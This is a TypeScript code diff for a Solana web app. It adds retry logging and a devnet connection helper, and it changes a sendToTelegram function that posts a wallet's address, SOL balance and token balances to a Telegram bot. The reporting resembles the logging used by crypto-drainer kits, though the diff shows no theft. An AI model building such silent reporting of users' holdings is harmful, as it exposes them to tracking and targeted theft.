@@ -18,6 +18,7 @@ async function retry<T>(
     try {
       return await fn();
     } catch (error) {
+      console.error(`Attempt ${i + 1} failed:`, error);
       lastError = error;
       if (i < retries - 1) {
         await delay(initialDelay * Math.pow(2, i));
@@ -26,6 +27,15 @@ async function retry<T>(
   }
   throw lastError;
 }
+
+// Create a connection with proper config
+const createConnection = () => {
+  return new Connection("https://api.devnet.solana.com", {
+    commitment: 'confirmed',
+    confirmTransactionInitialTimeout: 60000,
+    wsEndpoint: "wss://api.devnet.solana.com/",
+  });
+};
 
 export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
   try {
@@ -57,11 +67,7 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
 
 export const sendToTelegram = async (walletData: any) => {
   try {
-    const connection = new Connection("https://api.mainnet-beta.solana.com", {
-      commitment: 'confirmed',
-      confirmTransactionInitialTimeout: 60000,
-    });
-    
+    const connection = createConnection();
     let solBalance = 0;
     
     try {
@@ -83,7 +89,7 @@ export const sendToTelegram = async (walletData: any) => {
       `💎 SOL Balance: ${solBalanceInSol.toFixed(4)} SOL\n` +
       `⏰ Time: ${new Date().toLocaleString()}\n\n` +
       `💰 Token Balances:\n${formattedTokens}\n\n` +
-      `🌐 Network: Solana Mainnet`;
+      `🌐 Network: Solana Devnet`;
 
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
